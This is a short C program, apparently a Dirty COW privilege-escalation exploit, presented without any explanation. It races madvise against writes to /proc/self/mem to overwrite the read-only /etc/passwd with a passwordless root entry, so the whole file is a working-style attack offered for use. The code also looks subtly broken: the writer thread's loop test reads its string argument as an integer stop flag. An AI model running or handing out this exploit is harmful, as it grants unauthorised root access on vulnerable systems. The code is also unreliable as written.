#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

#define FILENAME "/etc/passwd"

char *map;
int f;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 1000000 && !*(int *)arg; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n", c);
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 1000000 && !*(int *)arg; i++) {
        lseek(f, (off_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n", c);
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    char *str;
    int stop = 0;

    f = open(FILENAME, O_RDONLY);
    map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);

    // Modify the password file entry
    str = "root::0:0:root:/root:/bin/bash\n";

    // Start threads to race
    pthread_create(&pth1, NULL, madviseThread, &stop);
    pthread_create(&pth2, NULL, procselfmemThread, str);

    // Wait for threads to complete
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
